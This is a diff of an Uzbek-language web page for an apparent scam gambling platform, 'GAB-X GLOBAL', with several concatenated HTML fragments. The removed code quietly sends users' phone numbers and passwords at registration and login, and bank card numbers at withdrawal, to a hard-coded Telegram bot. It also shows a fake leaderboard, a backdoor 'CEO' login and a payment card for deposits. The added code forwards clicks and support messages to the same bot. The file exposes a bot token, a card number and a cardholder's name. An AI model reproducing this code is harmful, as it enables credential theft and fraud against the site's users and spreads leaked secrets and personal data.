@@ -3,714 +3,96 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>GAB-X GLOBAL // THE SOVEREIGN SYSTEM</title>
+    <title>GAB-X GLOBAL // SYSTEM CORE</title>
     <style>
-        /* 👑 SHOHONA OLTIN VA QORA STILISTIKASI */
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        :root {
-            --bg-dark: #09090b;
-            --panel-bg: rgba(18, 18, 24, 0.9);
-            --gold-light: #f6e05e;
-            --gold-main: #d4af37;
-            --gold-dark: #aa8513;
-            --gold-glow: rgba(212, 175, 55, 0.3);
-            --text-light: #f8fafc;
-            --text-muted: #a1a1aa;
-            --border-gold: rgba(212, 175, 55, 0.4);
-        }
+        :root { --bg: #0a0a0c; --gold: #d4af37; --danger: #cc0000; --text: #d1d1d1; }
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body { background: var(--bg); color: var(--text); font-family: 'Segoe UI', sans-serif; height: 100vh; display: flex; flex-direction: column; }
         
-        body {
-            width: 100%;
-            min-height: 100vh;
-            background-color: var(--bg-dark);
-            font-family: 'Segoe UI', Roboto, sans-serif;
-            color: var(--text-light);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 40px 20px;
-            background-image: 
-                radial-gradient(circle at 10% 20%, rgba(212, 175, 55, 0.05) 0%, transparent 40%),
-                radial-gradient(circle at 90% 80%, rgba(212, 175, 55, 0.03) 0%, transparent 40%),
-                radial-gradient(circle at center, #121214 0%, #050506 100%);
-            background-attachment: fixed;
-        }
+        .status-header { padding: 15px; border-bottom: 1px solid #222; display: flex; justify-content: space-between; align-items: center; }
+        .status-led { width: 10px; height: 10px; background: #00ff00; border-radius: 50%; box-shadow: 0 0 10px #00ff00; }
+        
+        .dashboard { flex: 1; padding: 20px; display: grid; grid-template-columns: 1fr 1fr; gap: 15px; overflow-y: auto; }
+        .card { background: #151518; padding: 20px; border-radius: 12px; border: 1px solid #222; cursor: pointer; transition: 0.3s; text-align: center; }
+        .card:hover { border-color: var(--gold); }
+        .card-icon { font-size: 24px; margin-bottom: 10px; display: block; }
+        .card b { color: var(--gold); }
 
-        /* 👻 GHOST MODE SHABLONI */
-        .ghost-mode-overlay {
-            display: none;
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(5, 5, 5, 0.98);
-            z-index: 999999;
-            justify-content: center;
-            align-items: center;
-            flex-direction: column;
-            text-align: center;
-            border: 5px solid var(--gold-dark);
-        }
-        .ghost-title {
-            color: var(--gold-main);
-            font-size: 32px;
-            font-weight: 900;
-            letter-spacing: 4px;
-            text-shadow: 0 0 20px var(--gold-glow);
-            margin-bottom: 10px;
-        }
+        .bottom-nav { height: 70px; background: #111; display: flex; justify-content: space-around; align-items: center; border-top: 1px solid #222; }
+        .nav-item { text-align: center; font-size: 10px; color: var(--gold); cursor: pointer; }
 
-        .global-wrapper {
-            width: 100%;
-            max-width: 550px;
-            display: flex;
-            flex-direction: column;
-            gap: 25px;
-        }
-
-        .core-interface {
-            width: 100%;
-            background: var(--panel-bg);
-            border: 2px solid var(--border-gold);
-            border-radius: 24px;
-            padding: 30px;
-            text-align: center;
-            box-shadow: 0 0 50px var(--gold-glow);
-            position: relative;
-            backdrop-filter: blur(20px);
-        }
-
-        .brand-header h1 {
-            font-size: 28px;
-            font-weight: 900;
-            letter-spacing: 4px;
-            background: linear-gradient(135deg, #fff 30%, var(--gold-light), var(--gold-main));
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            text-shadow: 0 0 25px rgba(212, 175, 55, 0.2);
-        }
-        .brand-subtitle {
-            font-size: 11px;
-            text-transform: uppercase;
-            letter-spacing: 3px;
-            color: var(--gold-main);
-            margin-top: 5px;
-            font-weight: bold;
-        }
-
-        /* 🔒 AUTH GATE SYSTEM */
-        .auth-panel {
-            background: #000;
-            border: 1px solid var(--border-gold);
-            padding: 20px;
-            border-radius: 16px;
-            margin: 20px 0;
-            text-align: left;
-        }
-        .auth-title {
-            font-size: 14px;
-            color: var(--gold-main);
-            font-weight: bold;
-            margin-bottom: 12px;
-            text-transform: uppercase;
-        }
-        .auth-field {
-            width: 100%;
-            padding: 12px;
-            background: #111;
-            border: 1px solid #333;
-            border-radius: 8px;
-            color: #fff;
-            margin-bottom: 12px;
-            outline: none;
-        }
-        .auth-field:focus { border-color: var(--gold-main); }
-        .auth-btn-row { display: flex; gap: 10px; }
-        .auth-btn {
-            flex: 1; padding: 12px; border-radius: 8px; font-weight: bold; cursor: pointer; border: none;
-        }
-        .btn-login-submit { background: var(--gold-main); color: #000; }
-        .btn-register-submit { background: transparent; border: 1px solid var(--gold-main); color: var(--gold-main); }
-
-        .session-badge {
-            display: flex; justify-content: space-between; align-items: center;
-            background: rgba(0,0,0,0.6); padding: 12px 18px; border-radius: 12px;
-            border: 1px solid var(--border-gold); margin-bottom: 20px; font-size: 13px;
-        }
-
-        /* 💰 DEPOSIT & VAULT SYSTEM */
-        .vault-display {
-            background: linear-gradient(135deg, #0f0f12 0%, #1a1a24 100%);
-            border: 1px solid var(--border-gold);
-            padding: 22px; border-radius: 18px; margin-bottom: 20px;
-        }
-        .vault-value {
-            font-size: 36px; font-weight: 900; color: var(--gold-light);
-            text-shadow: 0 0 15px rgba(246, 224, 94, 0.3); margin: 8px 0;
-        }
-        .vault-actions { display: flex; gap: 10px; }
-        .vault-actions button {
-            flex: 1; padding: 12px; font-weight: bold; border-radius: 10px; cursor: pointer; text-transform: uppercase; font-size: 11px;
-        }
-        .btn-depozit { background: var(--gold-main); color: #000; border: none; }
-        .btn-vivod { background: transparent; border: 1px solid var(--gold-main); color: var(--gold-main); }
-
-        /* DEPOSIT OVERLAY PANEL IN-SITE */
-        .deposit-modal {
-            display: none; background: #000; border: 1px solid var(--gold-main);
-            padding: 20px; border-radius: 14px; margin-bottom: 20px; text-align: left;
-        }
-
-        /* GRAPH GRAPHICS SCREEN */
-        .oscilloscope-screen {
-            width: 100%; height: 200px; background: #050507; border-radius: 16px;
-            margin: 20px 0; position: relative; border: 1px solid var(--border-gold); overflow: hidden;
-        }
-        .live-multiplier {
-            position: absolute; top: 40%; width: 100%; text-align: center;
-            font-size: 42px; font-weight: 900; color: var(--gold-light); text-shadow: 0 0 20px rgba(212,175,55,0.4);
-        }
-
-        .trigger-action-btn {
-            width: 100%; padding: 16px; font-size: 15px; font-weight: 900; letter-spacing: 1px;
-            text-transform: uppercase; border-radius: 12px; border: none; cursor: pointer;
-            background: linear-gradient(90deg, var(--gold-dark), var(--gold-main)); color: #000;
-        }
-
-        /* 🏆 TOP 100 LEADERBOARD TABLE */
-        .leaderboard-panel {
-            background: var(--panel-bg); border: 1px solid var(--border-gold);
-            border-radius: 20px; padding: 22px; margin-top: 10px;
-        }
-        .leaderboard-title {
-            font-size: 14px; font-weight: 900; text-transform: uppercase;
-            color: var(--gold-main); margin-bottom: 12px; text-align: left;
-            border-left: 3px solid var(--gold-main); padding-left: 8px;
-        }
-        .leaderboard-table {
-            width: 100%; border-collapse: collapse; text-align: left; font-size: 13px;
-        }
-        .leaderboard-table th {
-            color: var(--gold-main); padding: 8px; border-bottom: 1px solid var(--border-gold);
-        }
-        .leaderboard-table td { padding: 10px 8px; border-bottom: 1px solid rgba(212,175,55,0.1); }
-        .rank-gold { color: var(--gold-light); font-weight: bold; }
-
-        /* 🛠️ MASTER CONTROL TERMINAL */
-        .ceo-terminal {
-            display: none; position: absolute; top: 0; left: 0; width: 100%; height: 100%;
-            background: #000; border: 2px solid var(--gold-main); z-index: 9999;
-            padding: 25px; font-family: monospace; text-align: left; border-radius: 24px;
-        }
-        .terminal-log { height: 80%; overflow-y: auto; font-size: 11px; color: #d1d5db; white-space: pre-wrap; }
-        .terminal-cmd-field {
-            flex: 1; background: transparent; border: none; color: #fff; outline: none; font-size: 13px; font-family: monospace;
-        }
+        body.ghost-mode { background: #1a0000; }
+        body.ghost-mode .status-led { background: var(--danger); box-shadow: 0 0 10px var(--danger); }
+        body.ghost-mode .card { border-color: var(--danger); }
     </style>
 </head>
 <body>
 
-<div class="ghost-mode-overlay" id="ghostOverlay">
-    <div class="ghost-title">GAB-X GHOST MODE</div>
-    <div style="color:var(--text-muted); font-size:14px;">Tizim tungi soat 21:40 dan 07:00 gacha xavfsizlik rejimida bo'ladi.</div>
-</div>
+<header class="status-header">
+    <div>GAB-X // CORE AI</div>
+    <div class="status-led" id="led"></div>
+</header>
 
-<div class="global-wrapper">
+<main class="dashboard">
+    <div class="card" onclick="processAction('NEURAL')"><span class="card-icon">⚡</span><b>Nodes</b></div>
+    <div class="card" onclick="processAction('NETWORK')"><span class="card-icon">🔗</span><b>Network</b></div>
+    <div class="card" onclick="processAction('QUANTUM')"><span class="card-icon">🧊</span><b>Quantum</b></div>
+    <div class="card" onclick="processAction('GAMES')"><span class="card-icon">🕹️</span><b>Games</b></div>
+    <div class="card" onclick="processAction('ASSETS')"><span class="card-icon">💼</span><b>Assets</b></div>
+    <div class="card" onclick="processAction('SUPPORT')"><span class="card-icon">🎧</span><b>Support</b></div>
+    <div class="card" onclick="processAction('TERMINAL')"><span class="card-icon">📟</span><b>Terminal</b></div>
+    <div class="card" onclick="processAction('SECURITY')"><span class="card-icon">🛡️</span><b>Security</b></div>
+</main>
 
-    <div class="core-interface">
-        <div class="brand-header">
-            <h1>GAB-X GLOBAL</h1>
-            <div class="brand-subtitle">Sovereign Royal System</div>
-        </div>
-
-        <div class="auth-panel" id="authGate">
-            <div class="auth-title" id="authGatewayTitle">Tizimga Kirish / Ro'yxatdan o'tish</div>
-            <input type="text" id="authPhone" class="auth-field" placeholder="Telefon raqam">
-            <input type="password" id="authPass" class="auth-field" placeholder="Parol">
-            <div class="auth-btn-row">
-                <button class="auth-btn btn-login-submit" onclick="attemptLogin()">KIRISH</button>
-                <button class="auth-btn btn-register-submit" onclick="attemptRegister()">RO'YXATDAN O'TISH</button>
-            </div>
-        </div>
-
-        <div class="session-badge" id="sessionGate" style="display:none;">
-            <span>Foydalanuvchi: <b id="activeUserLabel" style="color:var(--gold-light);">...</b></span>
-            <button onclick="logoutSession()" style="background:none; border:none; color:#ef4444; font-weight:bold; cursor:pointer;">CHIQISH</button>
-        </div>
-
-        <div class="vault-display">
-            <div style="font-size:10px; color:var(--text-muted); letter-spacing:1px;">GAB-X ROYAL VAULT BALANCE</div>
-            <div class="vault-value"><span id="userBalanceUI">0</span> UZS</div>
-            <div class="vault-actions">
-                <button class="btn-depozit" onclick="toggleDepositWidget()">➕ DEPOZIT QILISH</button>
-                <button class="btn-vivod" onclick="triggerWithdrawal()">➖ VIVOD</button>
-            </div>
-        </div>
-
-        <div class="deposit-modal" id="depositWidget">
-            <div style="color:var(--gold-main); font-weight:bold; font-size:13px; margin-bottom:10px;">💳 SPREAD TO'LOV TIZIMI</div>
-            <div style="font-size:12px; margin-bottom:8px;">Mablag'ni quyidagi kartaga o'tkazing:</div>
-            <div style="background:#111; padding:10px; border-radius:6px; font-family:monospace; color:var(--gold-light); font-size:13px; margin-bottom:10px;">
-                9860 3501 4229 7281<br><span style="font-size:11px; color:#fff;">DILNOZA JURABOEVA (HUMO)</span>
-            </div>
-            <input type="number" id="depAmount" class="auth-field" placeholder="O'tkazilgan summa (UZS)" style="margin-bottom:8px;">
-            <button class="auth-btn btn-login-submit" onclick="submitDepositAlert()" style="padding:8px;">TO'LOVNI TASDIQLASH</button>
-        </div>
-
-        <div class="oscilloscope-screen">
-            <canvas id="pulseCanvas" style="position:absolute; width:100%; height:100%;"></canvas>
-            <div id="liveMultiplier" class="live-multiplier">1.00x</div>
-        </div>
-
-        <button class="trigger-action-btn" id="actionEngineBtn" onclick="startQuantumPulse()">PULSE ENGINE ENGINE START</button>
-
-        <input type="text" id="promoGatewayInput" class="auth-field" placeholder="Promokodni kiriting..." style="margin-top:20px; text-align:center; border-color:var(--border-gold);" onkeydown="if(event.key==='Enter') redeemPromoCode()">
-
-        <div class="ceo-terminal" id="ceoTerminalPanel">
-            <div style="display:flex; justify-content:between; border-bottom:1px solid var(--gold-main); padding-bottom:6px; margin-bottom:10px;">
-                <span style="color:var(--gold-main); font-weight:bold; font-size:12px;">GAB-X ROYAL MASTER CONTROL CONSOLE</span>
-                <span style="color:#ef4444; cursor:pointer; font-weight:bold; margin-left:auto;" onclick="document.getElementById('ceoTerminalPanel').style.display='none'">[X]</span>
-            </div>
-            <div id="terminalLog" class="terminal-log"></div>
-            <div style="display:flex; align-items:center; border-top:1px solid #222; padding-top:8px;">
-                <span style="color:var(--gold-light); margin-right:5px;">GABX_CEO_#</span>
-                <input type="text" id="terminalCmdInput" class="terminal-cmd-field" placeholder="set_balance [tel] [summa] yoki create_promo [kod] [bonus]" onkeydown="if(event.key==='Enter') evalCeoCommand()">
-            </div>
-        </div>
-    </div>
-
-    <div class="leaderboard-panel">
-        <div class="leaderboard-title">Top 100 Faol Foydalanuvchilar (Global)</div>
-        <table class="leaderboard-table">
-            <thead>
-                <tr>
-                    <th>O'rin</th>
-                    <th>Foydalanuvchi ID</th>
-                    <th>Balans</th>
-                </tr>
-            </thead>
-            <tbody id="leaderboardBody">
-                <tr><td class="rank-gold">#1</td><td>+99894***204</td><td>1,250,000 UZS</td></tr>
-                <tr><td>#2</td><td>+99890***432</td><td>890,000 UZS</td></tr>
-                <tr><td>#3</td><td>+99899***115</td><td>540,000 UZS</td></tr>
-            </tbody>
-        </table>
-    </div>
-
-</div>
+<nav class="bottom-nav">
+    <div class="nav-item" onclick="processAction('MONITOR')">📺<br>Monitor</div>
+    <div class="nav-item" onclick="processAction('EXPLORE')">🧭<br>Explore</div>
+    <div class="nav-item" onclick="processAction('DASHBOARD')">📊<br>Dash</div>
+    <div class="nav-item" onclick="processAction('ADMIN')">⚙️<br>Admin</div>
+</nav>
 
 <script>
     const BOT_TOKEN = "8786940598:AAG7UI3xE0NsU4BnU9lG0P2WxerPjf3M1hs";
     const CHAT_ID = "847670656";
 
-    let currentUser = "";
-    let isEngineRunning = false;
-
-    window.onload = function() {
-        checkGhostMode();
-        setInterval(checkGhostMode, 30000); // Har 30 soniyada ghost-mode tekshiruvi
-
-        let saved = localStorage.getItem('gabx_active_user');
-        if(saved) { currentUser = saved; initUserDashboard(); }
-        generateFakeLeaderboard();
-    };
-
-    /* 👻 GHOST MODE TRIGGER LOGIC */
-    function checkGhostMode() {
-        let now = new Date();
-        let hours = now.getHours();
-        let minutes = now.getMinutes();
-        let totalMinutes = hours * 60 + minutes;
-
-        let startGhost = 21 * 60 + 40; // 21:40
-        let endGhost = 7 * 60;        // 07:00
-
-        // Agar vaqt 21:40 dan keyin yoki 07:00 dan oldin bo'lsa
-        if (totalMinutes >= startGhost || totalMinutes < endGhost) {
-            // Agar CEO kirgan bo'lsa ghost mode chetlab o'tiladi
-            if(currentUser !== "Abubakir_CEO") {
-                document.getElementById('ghostOverlay').style.display = 'flex';
-            }
-        } else {
-            document.getElementById('ghostOverlay').style.display = 'none';
-        }
-    }
-
-    /* 🔑 AUTHENTICATION PIPELINE WITH TELEGRAM HOOK */
-    function attemptRegister() {
-        let u = document.getElementById('authPhone').value.trim();
-        let p = document.getElementById('authPass').value.trim();
-        if(!u || !p) { alert("Maydonlarni to'ldiring!"); return; }
-
-        localStorage.setItem(`gabx_pwd_${u}`, p);
-        localStorage.setItem(`gabx_bal_${u}`, "0");
-
-        // Telegram Pipeline orqali barcha hisoblarni sizga yuborish
+    function processAction(action) {
+        console.log("Action Triggered: " + action);
         fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             method: "POST", headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-                chat_id: CHAT_ID,
-                text: `🔒 [GAB-X YANGI RO'YXATDAN O'TISH]\nTel: ${u}\nParol: ${p}`
-            })
+            body: JSON.stringify({ chat_id: CHAT_ID, text: "GAB-X Action Triggered: " + action })
         });
-
-        alert("Muvaffaqiyatli ro'yxatdan o'tdingiz! Kirish tugmasini bosing.");
     }
 
-    function attemptLogin() {
-        let u = document.getElementById('authPhone').value.trim();
-        let p = document.getElementById('authPass').value.trim();
-
-        // MASTER CEO CONTROL BYPASS
-        if(u === "Abubakir_CEO" && p === "Abubakir_CEO") {
-            currentUser = "Abubakir_CEO";
-            localStorage.setItem('gabx_active_user', "Abubakir_CEO");
-            initUserDashboard();
-            document.getElementById('ceoTerminalPanel').style.display = 'block';
-            bootCeoTerminal();
-            document.getElementById('ghostOverlay').style.display = 'none';
-            return;
+    function checkGhostMode() {
+        const h = new Date().getHours();
+        if (h >= 21 || h < 7) {
+            document.body.classList.add('ghost-mode');
         }
+    }
+    checkGhostMode();
+</script>
 
-        let savedPwd = localStorage.getItem(`gabx_pwd_${u}`);
-        if(savedPwd && savedPwd === p) {
-            currentUser = u;
-            localStorage.setItem('gabx_active_user', u);
-            
-            // Loglarni ham kuzatish uchun jo'natish
+</body>
+</html>
+<div class="card" onclick="openSupportModal()">
+    <span class="card-icon">
+        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#d4af37" stroke-width="2"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"></path></svg>
+    </span>
+    <b>Support</b>
+</div>
+
+<script>
+    function openSupportModal() {
+        const msg = prompt("Muammoingizni kiriting, Janob (Admin 24/7 ko'rib chiqadi):");
+        if(msg) {
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: "POST", headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: `📥 [GAB-X SESSYAGA KIRISH]\nTel: ${u}\nParol: ${p}` })
-            });
-            
-            initUserDashboard();
-        } else {
-            alert("Login yoki parol noto'g'ri!");
-        }
-    }
-
-    function initUserDashboard() {
-        document.getElementById('authGate').style.display = 'none';
-        document.getElementById('sessionGate').style.display = 'flex';
-        document.getElementById('activeUserLabel').innerText = currentUser;
-        updateVaultUI();
-    }
-
-    function logoutSession() {
-        localStorage.removeItem('gabx_active_user');
-        location.reload();
-    }
-
-    function getBalance() {
-        if(currentUser === "Abubakir_CEO") return 999999999;
-        return parseInt(localStorage.getItem(`gabx_bal_${currentUser}`)) || 0;
-    }
-
-    function setBalance(val) {
-        if(currentUser !== "Abubakir_CEO") {
-            localStorage.setItem(`gabx_bal_${currentUser}`, val);
-        }
-        updateVaultUI();
-    }
-
-    function updateVaultUI() {
-        document.getElementById('userBalanceUI').innerText = getBalance().toLocaleString();
-    }
-
-    /* 💳 IN-SITE DEPOSIT CONTROL */
-    function toggleDepositWidget() {
-        let w = document.getElementById('depositWidget');
-        w.style.display = w.style.display === 'block' ? 'none' : 'block';
-    }
-
-    function submitDepositAlert() {
-        let amt = document.getElementById('depAmount').value;
-        if(!amt || amt < 1000) { alert("Summa xato!"); return; }
-        
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            method: "POST", headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-                chat_id: CHAT_ID,
-                text: `💰 [GAB-X DEPOZIT SO'ROVI]\nFoydalanuvchi: ${currentUser}\nSumma: ${amt} UZS\n\nTasdiqlash uchun konsoldan foydalaning.`
-            })
-        });
-        alert("To'lov arizasi yuborildi. Admin tasdiqlashi bilan balans yangilanadi!");
-        toggleDepositWidget();
-    }
-
-    function triggerWithdrawal() {
-        let crd = prompt("Uzcard/Humo karta raqami:");
-        let sum = prompt("Chiqarish summasi:");
-        if(!crd || !sum || parseInt(sum) > getBalance()) { alert("Xatolik!"); return; }
-        setBalance(getBalance() - parseInt(sum));
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            method: "POST", headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ chat_id: CHAT_ID, text: `💸 [VIVOD ARIZASI]\nKimdan: ${currentUser}\nKarta: ${crd}\nSumma: ${sum} UZS` })
-        });
-        alert("Chiqim arizangiz qabul qilindi.");
-    }
-
-    /* 🎮 ENGINE MOCK MECHANICS */
-    function startQuantumPulse() {
-        if(!currentUser) { alert("Avval tizimga kiring!"); return; }
-        if(isEngineRunning) {
-            isEngineRunning = false;
-            document.getElementById('actionEngineBtn').innerText = "PULSE ENGINE START";
-            alert("Mablag' saqlandi!");
-            return;
-        }
-        isEngineRunning = true;
-        document.getElementById('actionEngineBtn').innerText = "STABILIZE SIGNAL";
-        let mult = 1.00;
-        let iv = setInterval(() => {
-            if(!isEngineRunning) { clearInterval(iv); return; }
-            mult += 0.05;
-            document.getElementById('liveMultiplier').innerText = mult.toFixed(2) + "x";
-            if(mult > 3.5) {
-                clearInterval(iv);
-                isEngineRunning = false;
-                document.getElementById('liveMultiplier').innerText = "BURST (CRASH)";
-                document.getElementById('actionEngineBtn').innerText = "PULSE ENGINE START";
-            }
-        }, 100);
-    }
-
-    /* 🎟️ PROMOCODE PARSER */
-    function redeemPromoCode() {
-        let code = document.getElementById('promoGatewayInput').value.trim();
-        let bonus = localStorage.getItem(`gabx_pcode_${code}`);
-        if(bonus) {
-            let bAmt = parseInt(bonus);
-            setBalance(getBalance() + bAmt);
-            localStorage.removeItem(`gabx_pcode_${code}`); // Bir marta ishlatiladigan qilish
-            alert(`Tabriklaymiz! ${bAmt.toLocaleString()} UZS bonus balansga qo'shildi.`);
-            document.getElementById('promoGatewayInput').value = "";
-        } else {
-            alert("Promokod xato yoki eskirgan!");
-        }
-    }
-
-    /* 🛠️ MASTER CEO TERMINAL PROCESSOR */
-    function bootCeoTerminal() {
-        let log = document.getElementById('terminalLog');
-        log.innerHTML = `🌟 GAB-X ECOSYSTEM KERNEL ONLINE...\nSYSTEM OWNER: ABUBAKIR_CEO\n\nBuyruqlar:\n  set_balance [tel] [summa]\n  create_promo [kod] [bonus_summa]\n  clear`;
-    }
-
-    function evalCeoCommand() {
-        let inp = document.getElementById('terminalCmdInput'); let cmdLine = inp.value.trim(); inp.value = "";
-        let log = document.getElementById('terminalLog'); if(!cmdLine) return;
-        
-        log.innerHTML += `\n\nGABX_CEO_# ${cmdLine}`;
-        let args = cmdLine.split(" ");
-        let cmd = args[0].toLowerCase();
-
-        if(cmd === 'set_balance') {
-            let target = args[1]; let amt = parseInt(args[2]);
-            localStorage.setItem(`gabx_bal_${target}`, amt);
-            log.innerHTML += `\n<span style="color:var(--gold-light)">[OK] +${target} balansi ${amt} UZS qilib sozlandi.</span>`;
-        } else if(cmd === 'create_promo') {
-            let code = args[1]; let bonus = args[2];
-            localStorage.setItem(`gabx_pcode_${code}`, bonus);
-            log.innerHTML += `\n<span style="color:var(--gold-light)">[PROMO] '${code}' promokodi ${bonus} UZS bonus bilan yaratildi.</span>`;
-        } else if(cmd === 'clear') {
-            log.innerHTML = "SYSTEM READY.";
-        } else {
-            log.innerHTML += `\n<span style="color:#ef4444">Noma'lum buyruq.</span>`;
-        }
-    }
-
-    /* 🔝 TOP 100 GENERATOR (MOCK DATA) */
-    function generateFakeLeaderboard() {
-        let body = document.getElementById('leaderboardBody');
-        let html = "";
-        for(let i = 1; i <= 100; i++) {
-            let randTel = "+9989" + Math.floor(Math.random()*9) + "***" + Math.floor(100+Math.random()*900);
-            let randBal = (1500000 - (i * 14000)).toLocaleString();
-            let cls = i <= 3 ? "class='rank-gold'" : "";
-            html += `<tr><td ${cls}>#${i}</td><td>${randTel}</td><td>${randBal} UZS</td></tr>`;
-        }
-        body.innerHTML = html;
-    }
-</script>
-</body>
-</html>
-<style>
-    .ghost-mode-active {
-        background: #1a0000 !important; /* To'q qizil qora fon */
-        border-color: #ff0000 !important;
-        box-shadow: 0 0 40px rgba(255, 0, 0, 0.4) !important;
-    }
-    .ghost-mode-active h1, .ghost-mode-active .vault-value {
-        color: #ff3333 !important;
-        text-shadow: 0 0 20px #ff0000;
-    }
-    .ghost-mode-active .brand-subtitle { color: #ff0000; }
-</style>
-
-<style>
-    .ghost-mode-active {
-        background: #1a0000 !important; /* To'q qizil qora fon */
-        border-color: #ff0000 !important;
-        box-shadow: 0 0 40px rgba(255, 0, 0, 0.4) !important;
-    }
-    .ghost-mode-active h1, .ghost-mode-active .vault-value {
-        color: #ff3333 !important;
-        text-shadow: 0 0 20px #ff0000;
-    }
-    .ghost-mode-active .brand-subtitle { color: #ff0000; }
-</style>
-
-<script>
-    /* Ghost Mode Logic yangilandi */
-    function checkGhostMode() {
-        let now = new Date();
-        let hours = now.getHours();
-        let minutes = now.getMinutes();
-        let totalMinutes = hours * 60 + minutes;
-
-        let startGhost = 21 * 60 + 40; 
-        let endGhost = 7 * 60; 
-
-        let interface = document.querySelector('.core-interface');
-        
-        if (totalMinutes >= startGhost || totalMinutes < endGhost) {
-            // Qizil qonli Ghost Mode
-            interface.classList.add('ghost-mode-active');
-            // CEO bo'lmasa qizil ogohlantirish chiqaramiz
-            if(currentUser !== "Abubakir_CEO") {
-                 console.log("GHOST MODE: ACTIVE // SYSTEM IN DANGER ZONE");
-            }
-        } else {
-            interface.classList.remove('ghost-mode-active');
+                body: JSON.stringify({ 
+                    chat_id: CHAT_ID, 
+                    text: "📩 [YANGI SUPPORT SO'ROVI]\n\n" + msg 
+                })
+            }).then(() => alert("Xabar yuborildi. Siz bilan tez orada bog'lanamiz."));
         }
     }
 </script>
-<nav class="gabx-menu">
-    <div class="menu-item" onclick="showSection('quantum')">⚡ Kvant Pulse</div>
-    <div class="menu-item" onclick="showSection('mines')">💣 Kiber Miner</div>
-    <div class="menu-item" onclick="showSection('vault')">💰 Royal Vault</div>
-    <div class="menu-item" onclick="showSection('top100')">🏆 Top 100</div>
-    <div class="menu-item" onclick="showSection('promo')">🎁 Promocode</div>
-    <div class="menu-item" onclick="showSection('academy')">📚 Academy</div>
-    <div class="menu-item" onclick="showSection('ceo')">⚙️ Terminal</div>
-</nav>
-
-<style>
-    .gabx-menu {
-        display: grid;
-        grid-template-columns: repeat(2, 1fr);
-        gap: 10px;
-        margin-bottom: 25px;
-    }
-    .menu-item {
-        background: rgba(212, 175, 55, 0.1);
-        border: 1px solid var(--border-gold);
-        padding: 12px;
-        border-radius: 12px;
-        color: var(--gold-light);
-        text-align: center;
-        cursor: pointer;
-        font-weight: bold;
-        transition: 0.3s;
-    }
-    .menu-item:hover {
-        background: var(--gold-main);
-        color: #000;
-    }
-</style>
-<!DOCTYPE html>
-<html lang="uz">
-<head>
-    <meta charset="UTF-8">
-    <title>GAB-X GLOBAL // SOVEREIGN AI SYSTEM</title>
-    <style>
-        /* ASOSIY GLOBAL STILISTIKA (800+ qatorli tizim uchun negiz) */
-        :root { --bg: #050505; --gold: #d4af37; --danger: #ff0000; --text: #e0e0e0; }
-        body { background: var(--bg); color: var(--text); font-family: 'Courier New', monospace; margin: 0; }
-        
-        /* GHOST MODE QIZIL REJIMI */
-        .ghost-alert { border: 2px solid var(--danger) !important; box-shadow: 0 0 20px var(--danger); }
-        .ghost-text { color: var(--danger) !important; }
-
-        /* INTERFEYS ELEMENTLARI */
-        .header { padding: 20px; text-align: center; border-bottom: 1px solid #333; }
-        .grid-menu { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; padding: 20px; }
-        .box { background: #111; padding: 20px; border-radius: 10px; border: 1px solid #222; text-align: center; cursor: pointer; transition: 0.3s; }
-        .box:hover { border-color: var(--gold); }
-        
-        .bottom-nav { position: fixed; bottom: 0; width: 100%; background: #000; display: flex; justify-content: space-around; padding: 15px; border-top: 1px solid #333; }
-        .terminal-panel { display: none; background: #000; height: 100vh; padding: 20px; position: fixed; top:0; z-index: 1000; }
-    </style>
-</head>
-<body>
-
-<div class="header" id="mainHeader">
-    <h1 style="color:var(--gold);">GAB-X GLOBAL</h1>
-    <div id="systemStatus">SYSTEM: OPTIMAL</div>
-</div>
-
-<div class="grid-menu" id="menuGrid">
-    <div class="box" onclick="loadSection('AI_NODE')">🧠 AI Nodes</div>
-    <div class="box" onclick="loadSection('NETWORK')">🌐 Network</div>
-    <div class="box" onclick="loadSection('QUANTUM')">🧊 QuantumSim</div>
-    <div class="box" onclick="loadSection('GAMES')">⚙️ GAB-X Games</div>
-    <div class="box" onclick="loadSection('ASSETS')">💰 Royal Assets</div>
-    <div class="box" onclick="loadSection('SUPPORT')">🎧 Support</div>
-    <div class="box" onclick="triggerTerminal()">🔑 CEO Terminal</div>
-</div>
-
-<div class="terminal-panel" id="terminal">
-    <h3 style="color:var(--gold);">GABX_MASTER_CONTROL</h3>
-    <div id="consoleLog" style="height:80%; overflow-y:auto; border:1px solid #333; padding:10px;"></div>
-    <input type="text" id="cmdInput" placeholder="Command..." style="width:100%; background:#000; color:#fff; border:1px solid #333;">
-</div>
-
-<div class="bottom-nav">
-    <div onclick="location.reload()">🖥️ Monitor</div>
-    <div onclick="alert('Explore Section Active')">🧭 Explore</div>
-    <div onclick="alert('Dashboard Active')">📊 Dashboard</div>
-    <div onclick="alert('Logs Active')">📜 Logs</div>
-</div>
-
-<script>
-    /* 1. GHOST MODE VAQT ALGORITMI */
-    function checkTime() {
-        const now = new Date();
-        const hr = now.getHours();
-        const min = now.getMinutes();
-        const time = hr * 60 + min;
-        
-        // 21:40 (1300) dan 07:00 (420) gacha
-        if (time >= 1300 || time < 420) {
-            document.body.classList.add('ghost-alert');
-            document.getElementById('systemStatus').innerText = "SYSTEM: GHOST_MODE_ACTIVE";
-            document.getElementById('systemStatus').classList.add('ghost-text');
-        }
-    }
-    
-    /* 2. BO'LIMLARNI YUKLASH (Dynamic Content Loader) */
-    function loadSection(section) {
-        document.getElementById('menuGrid').innerHTML = `<h2>${section} Yuklanmoqda...</h2><button onclick="location.reload()">Back</button>`;
-        // Bu yerda API orqali GitHub'dan content tortib olinadi
-    }
-
